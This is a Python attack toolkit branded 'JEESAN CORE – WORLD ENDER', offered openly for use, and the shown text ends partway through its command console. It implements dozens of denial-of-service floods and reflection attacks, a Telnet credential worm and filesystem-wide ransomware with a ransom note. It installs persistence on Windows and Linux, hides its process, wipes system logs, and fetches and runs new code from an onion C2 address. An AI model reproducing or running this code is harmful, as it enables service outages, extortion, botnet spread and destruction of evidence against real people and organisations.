#!/usr/bin/env python3
import os, sys, time, threading, random, socket, platform as _platform, ctypes, subprocess, ssl, struct, hashlib, base64, json, shutil
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init
import argparse

def ensure_module(module, pip_name=None):
    try:
        __import__(module)
    except ImportError:
        if _platform.system() == "Linux":
            if os.geteuid() == 0:
                os.system(f"pip3 install {pip_name or module} --break-system-packages 2>/dev/null || pip3 install {pip_name or module}")
            else:
                os.system(f"pip3 install {pip_name or module} --user")
        else:
            os.system(f"pip install {pip_name or module}")

ensure_module("requests")
ensure_module("scapy")
ensure_module("psutil")
ensure_module("cryptography")
ensure_module("h2", "h2")
ensure_module("cloudscraper")
ensure_module("dnspython")
if _platform.system() == "Linux":
    ensure_module("stem")

import requests
from scapy.all import IP, TCP, UDP, ICMP, ARP, DNS, DNSQR, Raw, RandIP, RandShort, RandInt, RandMAC, conf, send
from scapy.supersocket import SuperSocket
import psutil
from cryptography.fernet import Fernet
import h2.connection
import cloudscraper
if _platform.system() == "Linux":
    from stem.control import Controller as StemController, Signal as StemSignal
import dns.resolver

_original_del = SuperSocket.__del__
def safe_del(self):
    try:
        _original_del(self)
    except:
        pass
SuperSocket.__del__ = safe_del

import warnings
warnings.filterwarnings('ignore')

init(autoreset=True)
R, G, Y, B, C, M = Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA

IS_WIN = _platform.system() == "Windows"
IS_LIN = _platform.system() == "Linux"
IS_ROOT = ctypes.windll.shell32.IsUserAnAdmin() if IS_WIN else os.geteuid() == 0

JEESAN_BANNER = f"""{R}
       ██╗ ███████╗ ███████╗ ███████╗  █████╗  ███╗   ██╗
       ██║ ██╔════╝ ██╔════╝ ██╔════╝ ██╔══██╗ ████║  ██║
       ██║ █████╗   █████╗   ███████╗ ███████║ ██╔██║ ██║
  ██   ██║ ██╔══╝   ██╔══╝   ╚════██║ ██╔══██║ ██║╚██╗██║
  ╚█████╔╝ ███████╗ ███████╗ ███████║ ██║  ██║ ██║ ╚████║
   ╚════╝  ╚══════╝ ╚══════╝ ╚══════╝ ╚═╝  ╚═╝ ╚═╝  ╚═══╝
{R}          ██████╗  ██████╗  ██████╗  ███████╗
{R}         ██╔════╝ ██╔═══██╗ ██╔══██╗ ██╔════╝
{R}         ██║      ██║   ██║ ██████╔╝ █████╗  
{R}         ██║      ██║   ██║ ██╔══██╗ ██╔══╝  
{R}         ╚██████╗ ╚██████╔╝ ██║  ██║ ███████╗
{R}          ╚═════╝  ╚═════╝  ╚═╝  ╚═╝ ╚══════╝
{R}       JEESAN CORE – WORLD ENDER   by JEESAN
"""
JEESAN_SMALL = f"{G}JEESAN CORE v4.0 – IDLE{G}"

TARGET = ""
PORT = 80
HTTPS = False
ATTACK_RUNNING = False
BYTES_SENT = 0
PACKETS_SENT = 0
LAST_BYTES = 0
START_TIME = 0
NODES = set()
WORM_ACTIVE = False
RANSOMWARE_ENABLED = False
CF_BYPASS_MODE = False
RANSOM_KEY = Fernet.generate_key()
GLOBAL_ENCRYPTOR = Fernet(RANSOM_KEY)
C2_URL = "http://x7a2b9c.onion/command"
JEESAN_HOME = "/opt/jeesan-core.py" if IS_LIN else os.path.join(os.getenv('APPDATA', os.path.expanduser("~")), "jeesan-core.py")
PERSISTENT_SERVICE = "/etc/systemd/system/jeesan.service" if IS_LIN else ""
TOR_AUTH = "16:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Opera/9.80 (J2ME/MIDP; Opera Mini/5.1.22296/37.633; U; en) Presto/2.12.423 Version/12.16",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
]

STORED_TARGETS = {}

def tor_session():
    s = requests.Session()
    if IS_LIN and 'stem' in sys.modules:
        try:
            s.proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
        except:
            pass
    return s

def renew_tor():
    if not IS_LIN or 'stem' not in sys.modules:
        return
    try:
        with StemController.from_port(port=9051) as c:
            c.authenticate(password=TOR_AUTH)
            c.signal(StemSignal.NEWNYM)
    except:
        pass

def inject_junk():
    try:
        with open(__file__, "a", errors="ignore") as f:
            f.write(f"\n# junk {random.randint(1,99999):016d}\ndef __bogus_{random.randint(1,99999)}(): return {hex(random.randint(0,0xFFFFFFFF))}\n")
    except:
        pass

def hide_process():
    if IS_LIN and IS_ROOT:
        try:
            libc = ctypes.CDLL("libc.so.6")
            procname = b"[kworker/u8:1" + os.urandom(2) + b"]"
            libc.prctl(15, ctypes.c_char_p(procname), 0, 0, 0)
        except:
            pass
        os.system("mkdir -p /sys/fs/cgroup/jeesan && echo $$ > /sys/fs/cgroup/jeesan/cgroup.procs 2>/dev/null")
    elif IS_WIN:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def disable_logs():
    if IS_LIN and IS_ROOT:
        subprocess.run("systemctl stop rsyslog && systemctl disable rsyslog", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run("rm -rf /var/log/* 2>/dev/null", shell=True)
    elif IS_WIN and IS_ROOT:
        subprocess.run("wevtutil cl System", shell=True, capture_output=True)
        subprocess.run("wevtutil cl Application", shell=True, capture_output=True)
        subprocess.run("wevtutil cl Security", shell=True, capture_output=True)

def install_persistence():
    if IS_WIN:
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "JEESAN", 0, winreg.REG_SZ, f'"{sys.executable}" "{os.path.abspath(__file__)}"')
        except:
            if IS_ROOT:
                subprocess.run(f'schtasks /create /tn JEESAN /tr "{sys.executable} {os.path.abspath(__file__)}" /sc onstart /f', shell=True)
    elif IS_LIN:
        if IS_ROOT:
            svc = f"""[Unit]
Description=JEESAN CORE Doomsday Kernel Service
After=network.target tor.service

[Service]
Type=simple
ExecStart={sys.executable} {os.path.abspath(__file__)}
Restart=always
User=root
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target"""
            try:
                with open(PERSISTENT_SERVICE, 'w') as f:
                    f.write(svc)
                os.system("systemctl daemon-reload && systemctl enable jeesan.service && systemctl start jeesan.service")
            except:
                pass
            try:
                with open("/etc/rc.local", "a") as f:
                    f.write(f"\n{sys.executable} {os.path.abspath(__file__)} &\n")
            except:
                pass
        else:
            os.system(f'(crontab -l 2>/dev/null; echo "@reboot {sys.executable} {os.path.abspath(__file__)}") | crontab -')
            try:
                with open(os.path.expanduser("~/.bashrc"), "a") as f:
                    f.write(f"\n{sys.executable} {os.path.abspath(__file__)} &\n")
            except:
                pass

def ransomware_encrypt():
    if not RANSOMWARE_ENABLED or not IS_ROOT:
        return
    print(f"{R}[☠] JEESAN RANSOMWARE ACTIVE – Encrypting everything...")
    target_dirs = ["/", "/home", "/var", "/etc"] if IS_LIN else ["C:\\", "D:\\"]
    for base in target_dirs:
        for root, dirs, files in os.walk(base):
            for file in files:
                try:
                    fpath = os.path.join(root, file)
                    with open(fpath, "rb") as f:
                        data = f.read()
                    enc = GLOBAL_ENCRYPTOR.encrypt(data)
                    with open(fpath + ".JEESAN", "wb") as f:
                        f.write(enc)
                    os.remove(fpath)
                except:
                    pass
    note_path = "/root/READ_ME_RANSOM.txt" if IS_LIN else "C:\\READ_ME_RANSOM.txt"
    with open(note_path, "w") as f:
        f.write(f"YOUR FILES ARE ENCRYPTED BY JEESAN CORE\nSend 1 BTC to 1Jeesan...\nDecryption key (encrypted): {base64.b64encode(RANSOM_KEY).decode()}")

def find_origin_ip(domain):
    origins = []
    try:
        answers = dns.resolver.resolve(domain, 'A')
        for rdata in answers:
            origins.append(str(rdata))
    except:
        pass
    try:
        resp = requests.get(f"https://api.securitytrails.com/v1/history/{domain}/dns/a",
                            headers={"APIKEY": "YOUR_API_KEY_HERE"}, timeout=10)
        if resp.status_code == 200:
            for rec in resp.json().get('records', []):
                origins.append(rec.get('ip', ''))
    except:
        pass
    return list(set(origins))

def cf_challenge_bypass_flood():
    global BYTES_SENT, PACKETS_SENT
    scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'windows', 'desktop': True})
    while ATTACK_RUNNING and CF_BYPASS_MODE:
        try:
            scheme = "https" if HTTPS else "http"
            url = f"{scheme}://{TARGET}:{PORT}/"
            resp = scraper.get(url, timeout=10)
            BYTES_SENT += len(resp.content)
            PACKETS_SENT += 1
        except:
            pass
        time.sleep(0.05)

def cf_cache_poison():
    global BYTES_SENT, PACKETS_SENT
    while ATTACK_RUNNING and CF_BYPASS_MODE:
        try:
            s = tor_session()
            s.headers.update({"Host": TARGET, "X-Forwarded-For": RandIP(), "Cf-Connecting-IP": RandIP()})
            resp = s.get(f"http://{TARGET}/", timeout=5)
            BYTES_SENT += len(resp.content); PACKETS_SENT += 1
        except:
            pass

def cf_origin_flood():
    origins = find_origin_ip(TARGET)
    if not origins:
        return
    while ATTACK_RUNNING and CF_BYPASS_MODE:
        for ip in origins:
            try:
                s = requests.Session()
                s.get(f"http://{ip}/", headers={"Host": TARGET}, timeout=5)
                BYTES_SENT += 1024; PACKETS_SENT += 1
            except:
                pass
            time.sleep(0.01)

def syn_flood():
    global BYTES_SENT, PACKETS_SENT
    while ATTACK_RUNNING:
        try:
            pkt = IP(src=RandIP(), dst=TARGET, ttl=random.randint(1,255))/TCP(sport=RandShort(), dport=PORT, flags="S", seq=RandInt())/Raw(load=os.urandom(random.randint(64, 1400)))
            send(pkt, verbose=False)
            BYTES_SENT += len(pkt); PACKETS_SENT += 1
        except: pass

def ack_flood():
    global BYTES_SENT, PACKETS_SENT
    while ATTACK_RUNNING:
        try:
            pkt = IP(src=RandIP(), dst=TARGET)/TCP(sport=RandShort(), dport=PORT, flags="A")/Raw(load=os.urandom(1024))
            send(pkt, verbose=False)
            BYTES_SENT += 1024; PACKETS_SENT += 1
        except: pass

def fin_flood():
    global BYTES_SENT, PACKETS_SENT
    while ATTACK_RUNNING:
        try:
            pkt = IP(src=RandIP(), dst=TARGET)/TCP(sport=RandShort(), dport=PORT, flags="F")/Raw(load=os.urandom(512))
            send(pkt, verbose=False)
            BYTES_SENT += 512; PACKETS_SENT += 1
        except: pass

def xmas_flood():
    global BYTES_SENT, PACKETS_SENT
    while ATTACK_RUNNING:
        try:
            pkt = IP(src=RandIP(), dst=TARGET)/TCP(sport=RandShort(), dport=PORT, flags="FPU")/Raw(load=os.urandom(512))
            send(pkt, verbose=False)
            BYTES_SENT += 512; PACKETS_SENT += 1
        except: pass

def null_flood():
    global BYTES_SENT, PACKETS_SENT
    while ATTACK_RUNNING:
        try:
            pkt = IP(src=RandIP(), dst=TARGET)/TCP(sport=RandShort(), dport=PORT, flags="")/Raw(load=os.urandom(512))
            send(pkt, verbose=False)
            BYTES_SENT += 512; PACKETS_SENT += 1
        except: pass

def udp_flood():
    global BYTES_SENT, PACKETS_SENT
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while ATTACK_RUNNING:
        try:
            sock.sendto(os.urandom(random.randint(100, 1500)), (TARGET, random.randint(1,65535)))
            BYTES_SENT += 1400; PACKETS_SENT += 1
        except: pass

def icmp_flood():
    global BYTES_SENT, PACKETS_SENT
    while ATTACK_RUNNING:
        try:
            pkt = IP(dst=TARGET, src=RandIP()) / ICMP(type=8, code=0) / Raw(load=os.urandom(2000))
            send(pkt, verbose=False)
            BYTES_SENT += 2000; PACKETS_SENT += 1
        except: pass

def tcp_fragment_flood():
    global BYTES_SENT, PACKETS_SENT
    while ATTACK_RUNNING:
        try:
            ip = IP(src=RandIP(), dst=TARGET, flags="MF")
            tcp = TCP(sport=RandShort(), dport=PORT, flags="S")
            pkt = ip/tcp
            send(pkt, verbose=False)
            BYTES_SENT += len(pkt); PACKETS_SENT += 1
        except: pass

def arp_spoof_poison():
    if not IS_ROOT or not IS_LIN: return
    while ATTACK_RUNNING:
        try:
            send(ARP(op=2, pdst="192.168.1.1", hwdst="ff:ff:ff:ff:ff:ff", psrc=RandIP()), verbose=False)
            BYTES_SENT += 28; PACKETS_SENT += 1
        except: pass

def dns_hijack_flood():
    if not IS_ROOT: return
    while ATTACK_RUNNING:
        try:
            pkt = IP(src=RandIP(), dst=TARGET)/UDP(sport=RandShort(), dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com"))
            send(pkt, verbose=False)
            BYTES_SENT += 100; PACKETS_SENT += 1
        except: pass

def dns_amp():
    global BYTES_SENT, PACKETS_SENT
    payload = b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\xff\x00\x01"
    resolvers = ["8.8.8.8","1.1.1.1","9.9.9.9","208.67.222.222","8.8.4.4","64.6.64.6","4.2.2.4","208.67.220.220"]
    while ATTACK_RUNNING:
        for r in resolvers:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(payload, (r, 53))
                BYTES_SENT += 512; PACKETS_SENT += 1
            except: pass

def ntp_amp():
    global BYTES_SENT, PACKETS_SENT
    payload = b"\x17\x00\x03\x2a\x00\x00\x00\x00"
    servers = ["time.google.com","pool.ntp.org","time.windows.com","ntp1.aliyun.com","time.cloudflare.com","time.apple.com"]
    while ATTACK_RUNNING:
        for srv in servers:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(payload, (srv, 123))
                BYTES_SENT += len(payload); PACKETS_SENT += 1
            except: pass

def memcached_amp():
    global BYTES_SENT, PACKETS_SENT
    ips = ["127.0.0.1"]
    payload = b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
    while ATTACK_RUNNING:
        for ip in ips:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(payload, (ip, 11211))
                BYTES_SENT += 512; PACKETS_SENT += 1
            except: pass

def ssdp_amp():
    global BYTES_SENT, PACKETS_SENT
    payload = ("M-SEARCH * HTTP/1.1\r\n"
               "HOST: 239.255.255.250:1900\r\n"
               "MAN: \"ssdp:discover\"\r\n"
               "MX: 2\r\n"
               "ST: upnp:rootdevice\r\n"
               "\r\n").encode()
    while ATTACK_RUNNING:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 4)
        s.sendto(payload, ("239.255.255.250", 1900))
        BYTES_SENT += len(payload); PACKETS_SENT += 1
        time.sleep(1)

def chargen_amp():
    global BYTES_SENT, PACKETS_SENT
    payload = b"\x00\x00\x00\x00"
    ips = ["192.168.1.1"]
    while ATTACK_RUNNING:
        for ip in ips:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(payload, (ip, 19))
                BYTES_SENT += 1024; PACKETS_SENT += 1
            except: pass

def snmp_amp():
    global BYTES_SENT, PACKETS_SENT
    payload = b"\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa0\x19\x02\x04\x00\x00\x00\x01\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00"
    ips = ["192.168.1.1"]
    while ATTACK_RUNNING:
        for ip in ips:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(payload, (ip, 161))
                BYTES_SENT += len(payload); PACKETS_SENT += 1
            except: pass

def ldap_amp():
    global BYTES_SENT, PACKETS_SENT
    payload = b"\x30\x0c\x02\x01\x01\x60\x07\x02\x01\x03\x04\x00\x80\x00"
    ips = ["127.0.0.1"]
    while ATTACK_RUNNING:
        for ip in ips:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                if s.connect_ex((ip, 389)) == 0:
                    s.send(payload)
                    BYTES_SENT += len(payload); PACKETS_SENT += 1
                s.close()
            except: pass

def http_flood():
    global BYTES_SENT, PACKETS_SENT
    while ATTACK_RUNNING:
        try:
            s = tor_session()
            scheme = "https" if HTTPS else "http"
            s.get(f"{scheme}://{TARGET}:{PORT}/{random.randint(1,9999)}",
                  headers={"User-Agent": random.choice(USER_AGENTS),
                           "Cache-Control": "no-cache",
                           "Connection": "keep-alive",
                           "Accept": "*/*"},
                  timeout=5)
            BYTES_SENT += 1024; PACKETS_SENT += 1
        except: pass

def http2_flood():
    global BYTES_SENT, PACKETS_SENT
    while ATTACK_RUNNING:
        try:
            sock = socket.socket(); sock.settimeout(5)
            if HTTPS:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=TARGET)
            sock.connect((TARGET, PORT))
            client = h2.connection.H2Connection()
            client.initiate_connection()
            sock.sendall(client.data_to_send())
            headers = [
                (':method', 'GET'),
                (':path', f'/{random.randint(1,99999)}'),
                (':authority', TARGET),
                (':scheme', 'https' if HTTPS else 'http'),
                ('user-agent', random.choice(USER_AGENTS)),
                ('accept', '*/*')
            ]
            client.send_headers(client.get_next_available_stream_id(), headers, end_stream=True)
            sock.sendall(client.data_to_send())
            sock.close()
            BYTES_SENT += 2048; PACKETS_SENT += 1
        except: pass

def slowloris():
    global BYTES_SENT, PACKETS_SENT
    pool = []
    while ATTACK_RUNNING:
        while len(pool) < 1000:
            try:
                s = socket.socket(); s.settimeout(30)
                s.connect((TARGET, PORT))
                s.send(f"GET /?{random.random()} HTTP/1.1\r\nHost: {TARGET}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
                pool.append(s)
            except: pass
        for s in pool:
            try:
                s.send(f"X-Custom-{random.randint(0,9999)}: {random.random()}\r\n".encode())
                BYTES_SENT += 50; PACKETS_SENT += 1
            except: pool.remove(s)
        time.sleep(15)

def rudy_flood():
    global BYTES_SENT
    while ATTACK_RUNNING:
        try:
            s = socket.socket(); s.connect((TARGET, PORT))
            s.send(f"POST / HTTP/1.1\r\nHost: {TARGET}\r\nContent-Length: 999999999\r\n\r\n".encode())
            while ATTACK_RUNNING:
                s.send(b"\x00")
                BYTES_SENT += 1
                time.sleep(10)
        except: pass

def slow_read():
    global BYTES_SENT
    while ATTACK_RUNNING:
        try:
            s = socket.socket(); s.connect((TARGET, PORT))
            s.send(f"GET / HTTP/1.1\r\nHost: {TARGET}\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n".encode())
            s.settimeout(0.1)
            while ATTACK_RUNNING:
                try:
                    d = s.recv(1)
                    BYTES_SENT += 1
                except: break
                time.sleep(5)
        except: pass

def websocket_flood():
    global BYTES_SENT
    ws_payload = ("GET /ws HTTP/1.1\r\n"
                  f"Host: {TARGET}\r\n"
                  "Upgrade: websocket\r\n"
                  "Connection: Upgrade\r\n"
                  "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
                  "Sec-WebSocket-Version: 13\r\n"
                  f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                  "\r\n").encode()
    while ATTACK_RUNNING:
        try:
            s = socket.socket(); s.connect((TARGET, PORT))
            s.send(ws_payload)
            time.sleep(0.1)
            for _ in range(50):
                s.send(os.urandom(128))
                BYTES_SENT += 128
                time.sleep(0.2)
        except: pass

def cloudflare_nuke():
    global BYTES_SENT
    while ATTACK_RUNNING:
        try:
            s = tor_session()
            scheme = "https" if HTTPS else "http"
            payload = json.dumps({"data": "x" * 10000})
            s.post(f"{scheme}://{TARGET}/api/v1/data", data=payload, timeout=10)
            BYTES_SENT += len(payload)
            renew_tor()
        except: pass

def tls_renegotiation():
    global BYTES_SENT
    while ATTACK_RUNNING:
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
            s = socket.socket(); s.connect((TARGET, 443))
            ss = ctx.wrap_socket(s, server_hostname=TARGET)
            ss.do_handshake()
            ss.send(b'\x16\x03\x01\x00\x06\x0e\x00\x00\x00')
            ss.do_handshake()
            ss.close()
            BYTES_SENT += 1000
        except: pass

def ssl_read_flood():
    global BYTES_SENT
    while ATTACK_RUNNING:
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
            s = socket.socket(); s.connect((TARGET, 443))
            ss = ctx.wrap_socket(s)
            ss.do_handshake()
            while ATTACK_RUNNING:
                ss.read(1)
                BYTES_SENT += 1
        except: pass

def minecraft_ping():
    global BYTES_SENT, PACKETS_SENT
    while ATTACK_RUNNING:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((TARGET, PORT))
            handshake = b'\x00' + struct.pack('>i', 47) + TARGET.encode('utf-8') + struct.pack('>H', PORT) + b'\x02'
            s.send(handshake)
            BYTES_SENT += len(handshake); PACKETS_SENT += 1
            s.close()
        except: pass

def valve_source():
    global BYTES_SENT, PACKETS_SENT
    while ATTACK_RUNNING:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(2)
            s.sendto(b'\xFF\xFF\xFF\xFF\x54Source Engine Query\x00', (TARGET, PORT))
            BYTES_SENT += 25; PACKETS_SENT += 1
        except: pass

def gta5_online():
    global BYTES_SENT, PACKETS_SENT
    while ATTACK_RUNNING:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(os.urandom(500), (TARGET, 6672))
            BYTES_SENT += 500; PACKETS_SENT += 1
        except: pass

def mirai_login():
    global NODES
    while ATTACK_RUNNING and WORM_ACTIVE:
        ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        try:
            s = socket.socket(); s.settimeout(2)
            if s.connect_ex((ip, 23)) == 0:
                s.send(b"root\r\n"); time.sleep(0.5)
                s.send(b"root\r\n"); time.sleep(0.5)
                NODES.add(ip)
            s.close()
        except: pass
        time.sleep(0.1)

def ai_rotate_attack():
    vectors = [
        syn_flood, ack_flood, fin_flood, xmas_flood, null_flood,
        udp_flood, icmp_flood, tcp_fragment_flood,
        arp_spoof_poison, dns_hijack_flood,
        dns_amp, ntp_amp, memcached_amp, ssdp_amp, chargen_amp, snmp_amp, ldap_amp,
        http_flood, http2_flood, slowloris, rudy_flood, slow_read, websocket_flood,
        cloudflare_nuke, tls_renegotiation, ssl_read_flood,
        minecraft_ping, valve_source, gta5_online, mirai_login
    ]
    if CF_BYPASS_MODE:
        vectors += [cf_challenge_bypass_flood, cf_cache_poison, cf_origin_flood]
    while ATTACK_RUNNING:
        choice = random.choice(vectors)
        threading.Thread(target=choice, daemon=True).start()
        time.sleep(random.randint(2, 10))

def worm_scan():
    global NODES
    while ATTACK_RUNNING and WORM_ACTIVE:
        ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        for port in [22, 445, 23, 135, 3389, 5900, 1433, 8080]:
            try:
                s = socket.socket(); s.settimeout(0.5)
                if s.connect_ex((ip, port)) == 0:
                    NODES.add(f"{ip}:{port}")
                s.close()
            except: pass
        time.sleep(0.005)

def live_dashboard():
    global BYTES_SENT, PACKETS_SENT, START_TIME, LAST_BYTES
    idle_printed = False
    while True:
        if ATTACK_RUNNING:
            time.sleep(0.1)
            elapsed = time.time() - START_TIME
            diff = BYTES_SENT - LAST_BYTES
            speed_mbps = (diff * 8) / (0.1 * 1_000_000)
            LAST_BYTES = BYTES_SENT
            os.system('cls' if IS_WIN else 'clear')
            print(JEESAN_BANNER)
            print(f"{G}╔══════════════════════════════════════════════╗")
            print(f"{G}║  {C}TARGET: {M}{TARGET}:{PORT}                      {G}")
            print(f"{G}╠══════════════════════════════════════════════╣")
            print(f"{G}║  {C}Bytes Sent: {M}{BYTES_SENT/1e9:.3f} GB   {C}Speed: {M}{speed_mbps:.1f} Mbps  {G}")
            print(f"{G}║  {C}Packets:   {M}{PACKETS_SENT:,}   {C}Elapsed: {M}{int(elapsed)}s              {G}")
            print(f"{G}║  {C}Nodes:     {M}{len(NODES):,}   {C}Worm: {M}{'ON' if WORM_ACTIVE else 'OFF'}                {G}")
            print(f"{G}║  {C}Ransom:    {M}{'ON' if RANSOMWARE_ENABLED else 'OFF'}                            {G}")
            if CF_BYPASS_MODE:
                print(f"{G}║  {C}CF Bypass: {M}ON                         {G}║")
            print(f"{G}╚══════════════════════════════════════════════╝")
            print(f"{Y}  JEESAN CORE – WORLD ENDER ACTIVE")
            idle_printed = False
        else:
            if not idle_printed:
                os.system('cls' if IS_WIN else 'clear')
                print(JEESAN_SMALL)
                print(f"{G}╔══════════════════════════════════════════════╗")
                print(f"{G}║          {R}JEESAN CORE v4.0 - IDLE         {G}║")
                print(f"{G}╚══════════════════════════════════════════════╝")
                print(f"{Y}  Type 'help' to launch the apocalypse.")
                idle_printed = True
            time.sleep(0.8)

def launch_nuke():
    global ATTACK_RUNNING, START_TIME
    if ATTACK_RUNNING:
        print(f"{Y}[!] Already destroying.")
        return
    ATTACK_RUNNING = True
    START_TIME = time.time()
    print(f"{R}[🔥] JEESAN CORE – LAUNCHED ON {TARGET}:{PORT} – ALL 30+ VECTORS ACTIVE")
    vectors = [
        syn_flood, ack_flood, fin_flood, xmas_flood, null_flood,
        udp_flood, icmp_flood, tcp_fragment_flood,
        arp_spoof_poison, dns_hijack_flood,
        dns_amp, ntp_amp, memcached_amp, ssdp_amp, chargen_amp, snmp_amp, ldap_amp,
        http_flood, http2_flood, slowloris, rudy_flood, slow_read, websocket_flood,
        cloudflare_nuke, tls_renegotiation, ssl_read_flood,
        minecraft_ping, valve_source, gta5_online, mirai_login
    ]
    if CF_BYPASS_MODE:
        vectors += [cf_challenge_bypass_flood, cf_cache_poison, cf_origin_flood]
    with ThreadPoolExecutor(max_workers=2000) as ex:
        for _ in range(300):
            for v in vectors:
                ex.submit(v)
    threading.Thread(target=ai_rotate_attack, daemon=True).start()
    threading.Thread(target=polymorph_loop, daemon=True).start()
    threading.Thread(target=self_update, daemon=True).start()
    if WORM_ACTIVE:
        threading.Thread(target=worm_scan, daemon=True).start()
    if RANSOMWARE_ENABLED:
        threading.Thread(target=ransomware_encrypt, daemon=True).start()

def launch_swarm():
    global WORM_ACTIVE
    WORM_ACTIVE = True
    launch_nuke()

def polymorph_loop():
    while ATTACK_RUNNING:
        time.sleep(2)
        inject_junk()

def self_update():
    while ATTACK_RUNNING:
        try:
            s = tor_session()
            r = s.get(C2_URL, timeout=15)
            if r.status_code == 200:
                new_code = r.text
                with open(JEESAN_HOME, "w") as f:
                    f.write(new_code)
                os.chmod(JEESAN_HOME, 0o755)
                print(f"{G}[✓] Updated from C2. Relaunching...")
                os.execv(sys.executable, [sys.executable, JEESAN_HOME])
        except: pass
        time.sleep(600)

def toggle_ransom():
    global RANSOMWARE_ENABLED
    RANSOMWARE_ENABLED = not RANSOMWARE_ENABLED
    print(f"{G}[✓] Ransomware mode: {'ON' if RANSOMWARE_ENABLED else 'OFF'}")

def console():
    global TARGET, PORT, HTTPS, ATTACK_RUNNING, WORM_ACTIVE, RANSOMWARE_ENABLED, CF_BYPASS_MODE
    install_persistence()
    hide_process()
    disable_logs()
    threading.Thread(target=live_dashboard, daemon=True).start()
    print(f"{G}[✓] JEESAN CORE online | PID {os.getpid()} | {_platform.system()} | Root: {IS_ROOT}")
    while True:
        try:
            cmd = input(f"{M}JEESAN_CORE> {C}").strip().lower()
        except KeyboardInterrupt:
            print(f"\n{R}[!] SIGINT received. Exiting...")
            ATTACK_RUNNING = False
            break
        if cmd == "help":
            print(f"""
{G}JEESAN CORE COMMANDS:
  {C}set target <IP/domain>    {G}- Designate victim
  {C}set port <num>            {G}- Target port (80/443/any)
  {C}https on/off              {G}- Enable TLS
  {C}worm on/off               {G}- Worm propagation
  {C}ransom toggle             {G}- Turn Ransomware ON/OFF
  {C}cf bypass on/off          {G}- Enable Cloudflare/WAF bypass mode
  {C}nuke                      {G}- Launch all 30+ vectors
  {C}swarm                     {G}- Nuke + Worm + AI swarm
  {C}stop                      {G}- Halt attack (ransom continues)
  {C}nodes                     {G}- List infected bots
  {C}exit                      {G}- Terminate (persistence remains)
            """)
        elif cmd.startswith("set target"):
            parts = cmd.split()
            if len(parts) >= 3:
                TARGET = parts[2]
                print(f"{G}[✓] Target set to {TARGET}")
            else:
                print(f"{R}Usage: set target <IP/domain>")
        elif cmd.startswith("set port"):
            parts = cmd.split()
            if len(parts) >= 3:
                PORT = int(parts[2])
                HTTPS = True if PORT == 443 else False
                print(f"{G}[✓] Port = {PORT}, HTTPS={'ON' if HTTPS else 'OFF'}")
            else:
                print(f"{R}Usage: set port <number>")
        elif cmd == "https on":
            HTTPS = True; print(f"{G}[✓] HTTPS ON")
        elif cmd == "https off":
            HTTPS = False; print(f"{G}[✓] HTTPS OFF")
        elif cmd == "worm on":
            WORM_ACTIVE = True; print(f"{G}[✓] Worm enabled")
        elif cmd == "worm off":
            WORM_ACTIVE = False; print(f"{G}[✓] Worm disabled")
        elif cmd == "ransom toggle":
            toggle_ransom()
        elif cmd == "cf bypass on":
            CF_BYPASS_MODE = True
            print(f"{G}[✓] Cloudflare bypass ENABLED (JS solving, origin IP, cache poison)")
        elif cmd == "cf bypass off":
            CF_BYPASS_MODE = False
